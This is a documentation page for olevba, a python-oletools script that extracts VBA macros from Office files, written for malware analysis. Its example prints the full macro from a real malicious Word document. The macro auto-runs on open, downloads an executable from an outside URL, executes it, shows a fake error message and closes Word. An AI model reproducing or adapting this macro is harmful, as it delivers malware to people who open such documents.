olevba
======

olevba is a script to parse OLE and OpenXML files such as MS Office documents
(e.g. Word, Excel), to extract VBA Macro code in clear text.

It is part of the [python-oletools](http://www.decalage.info/python/oletools) package.

Supported formats:

- Word 97-2003 (.doc, .dot), Word 2007+ (.docm, .dotm)
- Excel 97-2003 (.xls), Excel 2007+ (.xlsm, .xlsb)
- PowerPoint 2007+ (.pptm, .ppsm)

olevba is based on source code from [officeparser](https://github.com/unixfreak0037/officeparser) by John William Davison

## Usage

	:::text
	olevba.py <file>

### Example

Checking the malware sample [DIAN_caso-5415.doc](https://malwr.com/analysis/M2I4YWRhM2IwY2QwNDljN2E3ZWFjYTg3ODk4NmZhYmE/):

	:::text
	>olevba.py DIAN_caso-5415.doc

	INFO: Extracting VBA Macros from OLE file DIAN_caso-5415.doc
	
	-------------------------------------------------------------------------------
	ThisDocument.cls
	
	Attribute VB_Name = "ThisDocument"
	Attribute VB_Base = "1Normal.ThisDocument"
	Attribute VB_GlobalNameSpace = False
	Attribute VB_Creatable = False
	Attribute VB_PredeclaredId = True
	Attribute VB_Exposed = True
	Attribute VB_TemplateDerived = True
	Attribute VB_Customizable = True
	Option Explicit
	Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal FVQGKS As Long,	_
	ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, _
	ByVal HQTLDG As Long) As Long
	Sub AutoOpen()
	    Auto_Open
	End Sub
	Sub Auto_Open()
	SNVJYQ
	End Sub
	Public Sub SNVJYQ()
	    OGEXYR "http://germanya.com.ec/logs/test.exe", Environ("TMP") & "\sfjozjero.exe"
	End Sub
	Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean
	    Dim HRKUYU, lala As Long
	    HRKUYU = URLDownloadToFileA(0, XSTAHU, PHHWIV, 0, 0)
	    If HRKUYU = 0 Then OGEXYR = True
	    Dim YKPZZS
	    YKPZZS = Shell(PHHWIV, 1)
	    MsgBox "El contenido de este documento no es compatible con este equipo." &	vbCrLf & vbCrLf & "Por favor intente desde otro equipo.", vbCritical, "Equipo no compatible"
	    lala = URLDownloadToFileA(0, "http://germanya.com.ec/logs/counter.php", Environ("TMP") & "\lkjljlljk", 0, 0)
	    Application.DisplayAlerts = False
	    Application.Quit
	End Function
	Sub Workbook_Open()
	    Auto_Open
	End Sub

## How to use olevba in Python applications	

TODO

--------------------------------------------------------------------------

python-oletools documentation
-----------------------------

- [[Home]]
- [[License]]
- [[Install]]
- [[Contribute]], Suggest Improvements or Report Issues
- Tools:
	- [[olebrowse]]
	- [[oleid]]
	- [[olemeta]]
	- [[oletimes]]
	- [[olevba]]
	- [[pyxswf]]
	- [[rtfobj]] 